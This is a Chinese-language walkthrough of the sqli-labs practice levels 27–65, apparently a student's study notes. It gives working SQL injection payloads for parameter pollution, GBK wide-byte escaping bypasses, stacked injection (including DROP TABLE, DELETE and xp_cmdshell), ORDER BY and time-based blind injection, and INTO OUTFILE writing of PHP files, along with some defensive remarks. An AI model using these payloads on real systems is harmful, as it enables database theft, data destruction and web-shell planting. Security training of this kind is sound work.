    ?id=2000"%a0UnIonSElecT%a0,1,user(),"3


### Less-28

本关卡与Less-27没有太大的差距，直接给出payload:

    ?id=2000')%a0unionselect(1),(user()),(3)||('1
    # select(1),2,3; # 注意：没有空格也可以输出成功的。


### Less-28a

本关卡与Less-28基本一致，只是过滤条件少了几个。直接给出payload:

    ?id=2000%27)union%0bsElect%0b1,@@basedir,3|(%271


# 十三、Background-6 服务器（两层）架构

![][base64str_1]

第Less-29~32关卡需要java+tomcat环境，把tomcat-files.zip 解压到tomcat 服务器webapp/ROOT 目录，完成环境搭建，访问如: <http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp>

服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供Web服务的是php服务器。工作流程是这样的：client访问服务器，能直接访问到tomcat服务器，然后Tomcat服务器再向Apache服务器请求数据。数据返回路径则相反。

**思考重点**：index.php?id=1&id=2，这时候显示id=1还是2？

Explain：Apache(php)解析最后一个参数即2，Tomcat(jsp)解析第一个参数即1。

web服务器 | 参数获取函数 | 获取到的参数
--------- | ------------ | ------------
PHP/Apache | $_GET("par") | Last
JSP/Tomcat | Request.getParameter("par") | First
Perl(CGI)/Apache | Param("par") | First
Python/Apache | getvalue("par") | All(List)
ASP/IIS | Request.QueryString("par") | All(comma-delimited string 逗号-分界)

此处我们想一个问题：index.jsp?id=1&id=2 请求，针对第一张图中的服务器配置情况，
客户端请求首先过tomcat，tomcat 解析第一个参数，接下来tomcat 去请求apache（php）
服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？

Answer：此处应该是id=2 的内容，应为时间上提供服务的是apache（php）服务器，
返回的数据也应该是apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，
那为什么要这么做？是因为我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一
个WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过WAF 的检测。该用法就
是HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客
户端都能够造成一定的威胁。


# 十四、答题模式-Less-29~31

### Less-29

首先这里我们查看jsp源码，它会对第一个参数id进行正则匹配 ` ^\\d+$ ` ，匹配通过后请求Apache(php)服务器。

根据HPP原理，我们可以构造payload:

    ?id=1&id=-1' union seslect 1,user(),3--+

在这里，我们要先绕过Tomcat的jsp代码先，因此需第一个id是正常值，&后面的id值才是我们的注入。


### Less-30

原理和Less-29是一直的，只是在sql处理上是双引号。因此此处也可以直接丢出payload:
    
    ?id=1&id=-1"union%20select%201,user(),3--+
    

### Less-31


原理和上述两个例子是一样的，只是sql处理上是双引号加括号的处理。因此此处也可以直接丢出payload:

    ?id=1&id=-1%22)union%20select%201,user(),3--+

> %22是双引号，%20是空格。


**总结**：从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有很多，不仅仅是我们上述列出过WAF一个方面，还有可以执行重复操作，可以执行非法操作等。同时针对WAF的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关HPP 的方法需要共同去研究。这也是一个新的方向。



# 十五、Background-7 宽字节注入

Less-32~37的六个关卡全部是都是针对 ' 和 \ 的过滤，所以我们放在一起进行讨论。

### 首先介绍宽字节注入：

原理：：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤’ 的时候，往往利用的思路是将  '  转换为  \' 。<br>
因此我们在此想办法将  '  前面添加的  \  除掉，一般有两种思路：

1. 利用 %df 吃掉 \  。具体的原因是 urlencode('\')=%5c%27 ，我们在%5c%27前面添加 %df ，形成 %df%5c%27，从上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此时 %df%5c 就是一个汉字， %27 则作为一个单独的符号在外面，同时也就达到了我们的目的。
2. 将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的 %5c 会被前面的 %5c 给注释掉。这也是bypass 绕过的一种方法。


# 十六、答题模式-Less-32~37

### Less-32

因为 urlencode('\\')=%5c%27 ，那么这里我们就利用 %df%5c%27 吃掉用来转义的 \ ，我们可以构造payload: 
    
    ?id=-1%%df%27union%20select%201,user(),3--+

前端显示了 root@localhost 。可以看到，我们绕过了 ' 的过滤。 


### Less-33

本关和Less-32的payload是一样的：

    ?id=-1%%df%27union%20select%201,user(),3--+
    
从源码中可以看到：

    function check_addslashes($string){
        $string= addslashes($string);    
        return $string;
    }

此处过滤使用函数 addalashes() ，函数返回在预定义字符之前添加反斜杠的字符串。

预定义字符是：
1. 单引号  ( ' )
2. 双引号  ( " )
3. 反斜杠  (  \\ )

**提示**：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。
Addslashes()函数和我们在Less-32关实现的功能基本一致的，所以我们依旧可以利用 %df 进行绕过。

**Notice**：使用addslashes(),我们需要将 mysql_query 设置为binary的方式，才能防御此漏洞。

    Mysql_query(“SETcharacter_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);
    

### Less-34

本关卡为post型注入，同样的也是将post过来的内容进行 ' 和 \ 的处理。

上面的例子是利用get请求将urlencode后的 \ 吃到。在Post请求中，此处介绍一个新方法：将utf-8转换为 utf-16 或 utf-32，例如将 ' 转为utf-16的  �'  。

> 个人理解：这里的�是有由类似%%%的东西组成的，然后再加上 ' (即%27)，然后相当于urlencode后类似 %EF%BF%%BD%27 的东西，然后是宽字符漏铜，%EF%BF会组成一个中文字符，而%BD%27也会被当成中文字符，然后php不会进行转义。然后语句流到mysql的时候，Mysql会将三个%转为一个中文字符，然后剩下%27作为引号，以此进行注入。

万能的payload:

    username: �' or 1=1# 
    password: 随便乱填
    
这里是登录成功的，此时的sql语句是：

    SELECT username, password FROM users WHERE username='�' or 1=1#' and password='$passwd' LIMIT 0,1
    
    
### Less-35

本关卡和Less-33是一样的，唯一的区别是sql语句不同，本关没有 ' " 符号的处理，那么我们就没有必要考虑check_addslashes()函数的意义了，直接给payload:

    ?id=-1%20union%20select%201,user(),3--+
    

### Less-36

我们直接看源代码：

    function check_quotes($string){
        $string= mysql_real_escape_string($string);    
        return $string;
    }

上面的check_quotes()函数利用了mysql_real_escape_string()函数进行的过滤。

mysql_real_escape_string()函数转义sql语句中使用的特殊字符：
1. \x00
2. \n
3. \r
4. \
5. '
6. "
7. \x1a

如果成功，则函数返回被转义的字符串。如果失败，则返回false。

但是因为Mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破，方法和以前一样，给出payload:

    ?id=-1%EF%BF%BD%27union%20select%201,user(),3--+

> 个人理解：3个%再加上%27，是以转 utf-16 漏洞绕过。

我们也可以用%df进行绕过，payload:

    ?id=-1%df%27union%20select%201,user(),3--+
    
**Notice**:在使用mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将mysql 设置为gbk 即可。

    # 设置代码：
    Mysql_set_charset(‘gbk’,’$conn’)
    
    
### Less-37

本关卡和Less-34是大致相似的，区别在于post内容使用的是mysql_real_escape_string()，而不是addslashes()函数，但是原理是一致的。

提交内容如下：

    username: �' or 1=1# 
    password: 随便乱填


**Summary**:

从上面的几关当中，可以总结一下过滤‘ \ 常用的三种方式是直接replace，addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。同时在上述过程中，我们也给出三种防御的方式，相信仔细看完已经明白了，这里就不赘述了。


# 十七、第三部分__page-3 Stacked injection Background-8 stacked injection

Stacked injections: 堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加 ;   表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。

### 0x01 原理介绍

在SQL 中，分号（;）是用来表示一条sql 语句的结束。堆叠注入是指构造利用 ; 后继续执行新命令的注入方式。

union  injection（联合注入）也是将两条语句合并在一起，但是union或者union all的语句类型通常只是查询而已。

EG示例 :
    
    # 用户注入： id=1;DELETE FROM products
    # 服务器未过滤，执行sql为：
    select * from products where id=1;DELETE FROM products
    
### 0x02 堆叠注入的局限性

堆叠注入并不是可以在每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当前还有权限不足。

虽然堆叠注入可以执行任意命令，但是在web系统中，通常指返回一个查询结果，因此第二个语句可能会产生错误或者结果被忽略，在前端界面是无法看到返回结果的。

在堆叠注入前，我们也需要知道数据库相关信息，如表名、列名。

### 0x03 各个数据库实例介绍

- mysql数据库
```sql
    # 新增表成功：
    select * from users where id=1;create table test like users;  # 可以使用like关键字
    # 删除表成功：
    select * from users where id=1;drop table test;
    # 查询数据成功：
    select * from users where id=1;select 1,2,3;  # 会查询出两个select结果
    # 加载文件成功：
    select * from users where id=1;select load_file('c:/tmpupbbn.php');
    # 修改数据成功：
    select * from users where id=1;insert into users(id,username,password) values('100','new','new');
```

- sql server数据库
```sql
    # 新增数据表：
    select * from test;create table sc3(ss CHAR(8));
    # 删除数据表：
    select * from test;drop table sc3;
    # 查询数据：
    select 1,2,3;select * from test;
    # 修改数据：
    select * from test;update test set name='test' where id=3;
    # sqlserver中最为重要的存储过程：
    select * from test where id=1;exec master..xp_cmdshell 'ipconfig'  # 可注意：EXEC master.dbo.xp_cmdshell
```

- oracle数据库
```sql
    # oracle不支持堆叠注入，会直接报错无效字符
```

- postgresql数据库
```sql
    # 新增数据表成功：
    select * from user_test;create table user_data(id DATE);
    # 删除数据表成功：
    select * from user_test;delete from user_data;
    # 查询数据成功：
    select * from user_test;select 1,2,3;
    # 修改数据成功：
    select * from user_test;update user_test set name='modify' where name='张三';
```

# 十八、答题模式-Less-38~45

### Less-38

> 注意：我们应当先尝试正常输入输出，再使用 Hackbar 的 load url ，防止 excute 错地址，这里我们要注入的地址是 login.php 而不是index.php 。

学习了 stacked injection 的相关知识，我们在本关得到直接的运用。给出简单的插入payload: 

    ?id=1%27;insert%20into%20users(id,username,password)%20values%20(%2738%27,%27Less38%27,%27hello%27)--+
    
同样前端正常返回，且注入成功。


### Less-39

本关卡和Less-38的区别在sql语句的不同，本关卡没有对id进行 ' id ' 的处理，即本关卡是数字型注入，同样构造简单的插入payload: 

    ?id=1;insert%20into%20users(id,username,password)%20values%20(%2739%27,%27Less39%27,%27hello%27)--+
    
同样前端正常返回，且注入成功。


### Less-40

本关卡sql语句也基本一致，在处理上是进行了 ( ' id ' ) 的处理，给出payload: 

    ?id=1%27);%20insert%20into%20users(id,username,password)%20values(%2740%27,%27Less40%27,%27hello%27)%23
    
同样前端正常返回，且注入成功。


### Less-41

本关卡和Less-39是一致的，区别是在于本关卡错误不回显，因此是盲注。但是payload还是可以共用：

    ?id=1;insert%20into%20users(id,username,password)%20values(%2741%27,%27Less41%27,%27hello%27)%23
    
同样前端正常返回，且注入成功。


### Less-42

查看源码：

    $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
    $password = $_POST["login_password"];
    
在此处 username 是经过 mysql_real_escape_string() 处理后的数据，存入到数据库不发生变化，因此这里和二次注入思路是不一样的。

由源码可知，password 变量在 post 过程中没有进行处理，所以我们可以在这里进行 attack 。

    username: 随意
    password: login_password=1';create table me like users--+&login_user=1 # 这里创建表成功
    password: login_password=1';drop table me--+&login_user=1 # 这里删除表成功

同样前端正常返回，且注入成功。


### Less-43

本关卡与Less-42关原理基本一致，区别处理为： ( ' password ') 。这里只给出示例payload: 
    
    login_password=1');create%20table%20less43%20like%20users--+&login_user=1

同样前端正常返回，且注入成功。


### Less-44

本关卡和Less-42是一致的，区别是在于本关卡错误不回显，因此是盲注。但是payload还是可以共用的：

    login_password=1';insert%20into%20users(id,username,password)%20values(%2744%27,%27Less44%27,%27hello%27)--+&login_user=1
    
同样前端正常返回，且注入成功。

> 注意：--+ 一定不能少，因为这里是sql注入，php后端还会有sql的后续语句，需要 --+/#/%23 的注释来完成构造。


### Less-45

本关卡和Less-42是一致的，区别是在于本关卡错误不回显，因此是盲注。但是payload还是可以共用的：

    login_password=1');insert%20into%20users(id,username,password)%20values(%2745%27,%27Less45%27,%27hello%27)--+&login_user=1
    
同样前端正常返回，且注入成功。


# 十九、Background-9 order by 后的injection

此处应介绍 order by 后的注入以及 limit 注入，我们结合 Less-46 更容易讲解，(会在 Less46 中详细讲解)，所以此处可根据 Less-46 了解即可。


# 二十、答题模式-Less-46~53

### Less-46

从本关卡开始，我们开始学习 order by 相关注入的知识。

本关的 sql 语句为：

    $sql = " select * from users order by $id "
    
首先我们先尝试一下常规输入后，前端的显示。从输入的参数我们可以猜出这是 order 方式的前端显示，常规输入为 列名、列位、带 asc/desc 。

当尝试 desc/asc 显示的结果不同，则表明可以注入。

从上述的 sql 语句可以看出，我们的注入点在 order by 后面的参数中，而 order by 不同于 where 后的注入点，不能使用 union 等注入。

首先我们来看看 mysql 的 select 官方文档。

```sql
mysql> help select;
Name: 'SELECT'
Description:
Syntax:
SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]
```

我们可利用 order by 后的一些参数进行注入。

**首先**

(1) order by 后的数字可以作为一个注入点。也就是构造 order by 后的一个语句，让该语句执行结果为一个数，这里尝试：

    ?sort=left(version(),1)
    ?sort=right(version(),1)
    
这两个均没有报错且结果都是一样的，这里我们 version()=5.6.17，说明数字没有其作用。

我们就可考虑布尔类型了！可以利用报错注入和延时注入。

此处可以直接构造 ` ?sort= 一个参数 ` 。此时我们有三种形式：

1. 直接添加注入语句，?sort=(select ***)
2. 利用一些函数。例如 rand() 函数等。 ?sort=rand(sql语句)。
> 注意，实践了一下：<br>
rand(true)和rand(false)的结果是不一样的。<br>
rand(1) 和 rand(0) 的结果是不一样的。<br>
而且，?sort=0.155 和 ?sort=0.405的结果是一样的。
3. 利用and，例如 ?sort=1 and ( sql语句 )
> 注意在此同时，sql语句可以利用报错注入和延时注入的方式，可以灵活构造。

EG: 

    # 报错注入示范：
    ?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))
    ?sort=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2)))
    # 这里尝试 rand(0/1) 构造错误，可以显示 root@loaclhost 用户名

    # 接下来利用rand()示范：
    ?sort=rand(ascii(left(database(),1))=115) # rand(true) 
    ?sort=rand(ascii(left(database(),1))=116) # rand(false)
    # 这里示范出来的payload结果是不同的，可以得知注入是成功的。

    # 延时注入示范：
    ?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=115,0,sleep(5))
    ?sort=1%20and%20IF(ASCII(SUBSTR(database(),1,1))=116,0,sleep(5))
    # 根据响应时间也可以得知延时注入是成功的。
    
(2) procedure analyse 参数后注入

利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。

    ?sort=1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)
    # 注意：此处在本地进行学习实践时候会sql报错，但是不影响学习payload构造思路。
    
(3) 导入导出文件into outfile 参数

将查询结果导入文件

    ?sort=1%20into%20outfile%20%22c:\\wamp\\www\\MySQL_Injection_Linux\\test1.txt%22 
    # 解释%22是双引号
    
注意：此时前端显示为空，查询结果直接转存到文件。

这个时候我们可以考虑上传网马，利用 lines terminated by ：<br>

    into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16 进制转换)<br>
    
解释：lines terminated by '\r\n' 表示指定各条记录之间用 '\r\n' 分隔。


### Less-47

本关的 sql 语句为 

    $sql = " select * from users order by ' $id ' " ;

这里是进行 id 的处理，我们依然进行分类注入。

(1) order by 后的参数

我们只能使用 and 来进行报错和延时注入。给出示例 payload ：

    # 1. and rand 相结合的方式，payload 如下：
    ?sort=1%27%20and%20rand(ascii(left(database(),1))=115)--+
    ?sort=1%27%20and%20rand(ascii(left(database(),1))=115)--+
    # 但是需要注意的是，这里我们 rand(true/false) 均都会是一样的结果，但是不影响我们学习注入思路。
    # 我们不能使用这种方式进行准确的注入，此处仅供学习参考。

    # 2. 可以利用报错的方式进行
    ?sort=1%27and%20(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))--+
    # 注意此方式可能在 rand() 上存在不准确的随机值，可以多尝试 rand(0/1) 多尝试几次。
    # 这里再放一个报错注入，利用mysql重复项原理：
    ?sort=1%27and%20(select%20*%20from%20(select%20NAME_CONST(version(),1),NAME_const(version(),1))x)--+

    # 3. 延时注入：
    ?sort=1%27and%20if(ascii(substr(database(),1,1))=115,0,sleep(5))--+
    ?sort=1%27and%20if(ascii(substr(database(),1,1))=116,0,sleep(5))--+
    
(2) procedure analyse 参数后注入

利用procedure analyse 参数，我们可以执行报错注入。同时，在procedure analyse 和order by 之间可以存在limit 参数，我们在实际应用中，往往也可能会存在limit 后的注入，可以利用procedure analyse 进行注入。以下为示范：

    ?sort=1%27procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)--+
    # 注意这里在学习实验中是报错的，非预期结果，或环境原因，不影响学习思路。
    
(3) 导入导出文件into outfile 参数

    ?sort=1%27%20into%20outfile%20%22c:\\wamp\\www\\MySQL_Injection_Linux\\test47.txt%22 --+
    # 注意这里是注入，需要添加 --+ ，查询结果会导入到文件中。
    # 同样，可以考虑上传网马，这里实践写出 payload: 
    ?sort=1%27%20into%20outfile%20%22c:\\wamp\\www\\MySQL_Injection_Linux\\test47.php%22%20lines%20terminated%20by 0x3c3f70687020706870696e666f28293b3f3e--+
    上述语句等价于：sort=1' into outfile dir+filename lines terminate by 0x <?php phpinfo();>的hackbar里的16进制编码 --+
    # 然后访问导出目标文件，可以看到php信息页面。


### Less-48

本关与 Less-48 的区别在于前端不回显错误。

给出payload: 

    # 1. 可以利用 sort=rand(true/falses)
    ?sort=rand(ascii(left(database(),1))=115) # ascii(s)=115
    ?sort=rand(ascii(left(database(),1))=116)
    # 这里在实验环境结果是不一样的，证明注入思路正确
    # 2. 使用 and 后的延时注入
    ?sort=1%20and%20if(ascii(substr(database(),1,1))=115,0,sleep(5))
    ?sort=1%20and%20if(ascii(substr(database(),1,1))=116,0,sleep(5))
    

### Less-49
    
本关与 Less-48 的区别在于前端不回显错误。

给出payload:

    # 1. 利用延时注入
    ?sort=1%27%20and%20(If(ascii(substr((select%20username%20from%20users%20where%20id=1),1,1))=69,0,sleep(2)))--+
    # 2. 利用 into outfile 注入
    ?sort=1%27%20into%20outfile%20%22c:\\wamp\\www\\MySQL_Injection_Linux\\test49.php%22%20lines%20terminated%20by%200x3c3f70687020706870696e666f28293f3e--+
    # 注意记得 lines terminated by 0x...


### Less-50

本关开始，进行 order by stacked injection !

这里使用的是mysqli_multi_query()函数，而之前使用的是mysqli_query()。<br>
区别在于mysqli_multi_query()可以执行多个sql 语句，而mysqli_query()只能执行一个sql 语句。<br>
因此我们可以注入执行多个sql 语句注入 statcked injection。
    
上述的 sort还是可行的就不重复了，下面给出 stacked injection 的payload:

    ?sort=1;create%20table%20less50%20like%20users  # 创建表成功

    
### Less-51

本关卡 sql 语句进行了 ' id ' 处理，因此在注入后需要注释最后的单引号，此处给出payload:

    ?sort=1%27;create%20table%20less51%20like%20users--+  # 创建表成功


### Less-52

本关与 Less-50 的区别在于前端不回显错误。

给出payload: 

    ?sort=1;create%20table%20less52%20like%20users  # 创建表成功


### Less-53

本关与 Less-51 的区别在于前端不回显错误。

给出payload: 

    ?sort=1%27;create%20table%20less53%20like%20users--+  # 创建表成功


# 二十一、第四部分/page-4 Challenges 答题模式Less-54~64

本系列为进阶学习，主要应用学习。

### Less-54

由前端提示，这一关我们主要考察是字符型注入，且只能尝试十次，以后随机重置数据库。<br>
且这里我们已知数据库名为：CHALLENGES 。

学习实践注入过程：

    ID:2000%27%20oR%201=1--+
    ID:2000%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27--+
    ID:2000%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27challenges%27%20and%20table_name=%27tsquqwumms%27--+
    ID:2000%27%20union%20select%20sessid,secret_S10L,tryy%20from%20tsquqwumms--+

提交 secret ，前端提示 CONGRATS YOU NAILED IT ，注入成功。

> Less-54 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-55

本关卡和 Less-54 的思路是一致的，这里就不给出payload了，但是这里再提醒一般常用语句：

- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

> Less-55 -> $sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";


### Less-56

这里和 Less-54/55 思路基本一致，给出payload:

    ?id=-1%27)%20Or%201=1--+
    ?id=-1%27)%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+
    ?id=-1%27)%20union%20select%20sessid,secret_L24X,tryy%20from%20ikywajvkei--+

> Less-56 -> $sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";


### Less-57

这里和 Less-54/55/56 思路基本一致，省略 payload 了。

> Less-57 -> <br>
$id= '"'.$id.'"';<br>
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-58

本关卡即使 id=-1 也会返回数据，但允许报错型注入。

给出实验学习payload:

    ?id=2000' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges' ),0x7e))--+
    ?id=2000' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='zc095sw0dp' ),0x7e))--+
    ?id=2000' and extractvalue(1,concat(0x7e,(select concat('_',secret_04AR,'_') from zc095sw0dp ),0x7e))--+

本关卡没有返回数据库中的数据，只是前端显示数据而已，因此不能 union 注入，应该走报错注入思路。

> Less-58 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-59

本关卡和 Less-58思路基本一致，省略 payload 了。

> Less-59 -> $sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-60

本关卡和 Less-59思路基本一致，省略 payload 了。

> Less-60 -><br>
$id = '("'.$id.'")';<br>
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-61

本关卡和 Less-60思路基本一致，省略 payload 了。

> Less-61 -> $sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";


### Less-62

此处 union 和报错注入都失效，这里我们就使用延时注入了，此处给出一个示例 payload :

    ?id=1%27)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=119,0,sleep(10))--+

这里使用延时注入，可以适当尝试脚本。

> Less-62 -> $sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";


### Less-63

本关卡和 Less-62思路基本一致，省略 payload 了。

> Less-63 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-64

本关卡和 Less-63思路基本一致，省略 payload 了。

> Less-64 -> $sql="SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1";


### Less-65

本关卡和 Less-63思路基本一致，省略 payload 了。

> Less-65 -> <br>
$id = '"'.$id.'"';<br>
$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";


# 二十二、后记

1. 对工具的使用
2. 对整项工作的看法
3. 对数据库未来的看法
4. 对实验后续的认识



[base64str_1]:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu0AAAGyCAYAAABQjvrYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAP+lSURBVHhe7J0HgBU114axdwXsvX323ntFQEQBUVARFGwIKmLvFcWCWBBRQRABGyKIYsOGDRUpSpPeYWF733v37u75z5PlrMP+lmW/i98unhfOJpPJZDInJ8mb3EymjjgcDofD4XA4HI4aDSftDofD4XA4HA5HDYeTdofD4XA4HA6Ho4bDSbvD4XA4HA6Hw1HD4aTd4XA4HA6Hw+Go4XDS7nA4HA6Hw+Fw1HA4aXc4HA6Hw+FwOGo4nLQ7HA6Hw+FwOBw1HE7aHQ6Hw+FwOByOGg4n7Q6Hw+FwOBwORw2Hk3aHw+FwOBwOh6OGw0m7w+FwOBwOh8NRw+Gk3eFwOBwOh8PhqOFw0u5wOBwOh8PhcNRwOGl3OBwOh8PhcDhqOJy0OxwOh8PhcDgcNRxO2h0Oh8PhcDgcjhoOJ+0Oh8PhcDgcDkcNh5N2h8PhcDgcDoejhsNJu8PhqJEoKytb6Sv3JxKJCn/0nMPhcDgc1UG0P8EtKSmp8AM7rilw0u5wOGocaDBLS0sDUY/H48FfXFwshYWFwU9Dao2ti4uLi4tLdYU+xVz6GUAfk5eX56Td4XA4/g40oBD2oqKiQNQ5zs3Nleeff16GDRsmr776qgwcONDFxcXFxSUpMnjw4OC+9tprMmjQIOnVq5eTdofD4fg7MOPBDLstieF4yZIlsv7660v79u3lggsucHFxcXFx+a/l/PPPD26bNm2kZcuWwd+sWTOpX79+mDSqSXDS7nA4aiSYXQcQdiQ/P1823nhjycrKCueYAXFxcXFxcflvhAkiftU10N8sWLBAdtppJykoKFgZWjPgpN3hcNQ4GCnHpUFFIO116tQJYTSqDofD4XD8N6CfYTbdSLv1L8uWLZNNNtkkhNUkOGl3OBw1EjSeBhpR1rQbaYfER887HA6Hw7G6MJJuLi+i0r+sWLFCNt100xrXzzhpdzgcNQ40lKxnt8aUmZD09HRZZ511KsIcDofD4fhvwEw7s+wQdfoWQP8Cad98880lFouFsJoCJ+0Oh6NGwoi7geUxG264YcVMiJF3FxcXFxeX6grAtYki+pelS5dKvXr1VumDagKctDscjhqL6MyHr2l3OBwOR7Jh5B1h5h0w0+5r2h0Oh2M14KTd4XA4HGsSTtodDocjCXDS7nA4HI41CSftDofDkQQ4aXc4HA7HmoSTdofD4UgCnLQ7HA6HY03CSbvD4XAkAU7aHQ6Hw7Em4aTd4XA4kgAn7Q6Hw+FYk3DS7nA4HEmAk3aHw+FwrEk4aXc4HI4kwEm7w+FwONYknLQ7HA5HEuCk3eFwOBxrEk7aHQ6HIwlw0u5wOByONQkn7Q6Hw5EEOGl3OBwOx5qEk3aHw+FIApy0OxwOh2NNwkm7w+FwJAFO2h0Oh8OxJuGk3eFwOJIAJ+0Oh8PhWJNw0u5wOBxJgJN2h8PhcKxJOGl3OByOJMBJu8PhcDjWJJy0OxwORxLgpN3hcDgcaxJO2h0OhyMJcNLucDgcjjUJJ+0Oh8ORBDhpdzgcDseahJN2h8PhSAKctDscDodjTcJJu8PhcCQBTtodDofDsSbhpN3hcDiSACftDofD4ViTcNLucDgcSYCTdofD4XCsSThpdzgcjiTASbvD4XA41iSctP+PgLKLi4tDh24FgJ+wKKJEAHCd+c0FxEMSicQqaUTjGDhvhQ0KCgoq7oNbVFQU0kHsfibR+9gzOBwOJ+0Oh8PhWLOI8jHjcU7a/yGg9Hg8Lnl5eRXKx83NzQ1kuHKHn52dLbFYLIRXxkMPPSR77bWX7LfffrL33nvL7rvvLrvttlsQ/HvssYfss88+wX/AAQeEcCPclh73hYxzT8IsvLCwMBB7jskfYuct3w7Hvx1O2h0Oh8OxJmHcK8q/nLT/A4AwQ9hROi4du82SG2k2WMEYoW7VqpUceeSRcuihhwb3sMMOk+22207WW289WXfddYO7wQYbyIYbblghhG+88caBSODfaKON5MADD5SDDjooCGlx/O2334Z7QDoYIJA3Zt6jRJ18cA5E8+lw/Jth5Jw64aTd4XA4HMmG8TDESfs/COvMjbRzDBmms8fP7DbHgHhnnnmmHHfccUF22mmnCjIOOYeMQ8Ih4xAFI+0cR2X99deXLbfcsoK4c4xL/HXWWSe4RxxxhJx44oly6qmnyvvvvx/uXZl0mLFY/hwOh5N2h8PhcKxZ0KeYOGn/B0FHzgw25By/FQCCPy0tLRD1Bg0aBKlbt24oFMi1EXVItwnkG5KAEAdCv+mmm4Zz+O06JBrPyH69evXCuSiBZ+adezdq1Eh69+69yjIe8sivAjbj7nD82+Gk3eFwOBxrEvQpJk7a/0GYwpllR5i1Jmzu3LnSvHlzadKkSSDcEG86fwg1s+SQ7CgpJxw/cfETxnF0Jh2X6yDiuJtttllFmoThp8A333zzcMz1uEb4cVkPf8EFF8gzzzwT1rdD4CEjti7e4fi3w0m7w+FwONYk6FNMnLT/g7DO3Ijvzz//LO3bt5cWLVqsMgMOCY8Sawi0kXWEOJxv166dDBo0SF577bXgDh48uEKGDBkir7/+ugwYMEDeeOMNGThwYIgDISdd0jSybumZyzmbeed+//nPf+TSSy+VBx98MAw0zGgcjn87nLQ7HA6HY03CCDvipP0fhCmcFz87d+4s5557bgVJrkyWjUwjEGcI/S233CIvvvhihfz6668hPQYAkGkjCjYoiBawraHnuj59+sjLL79ckc7BBx8c7sO9TcgDYsfkjd1nrrnmGunWrVtI0+H4t8NJu8PhcDjW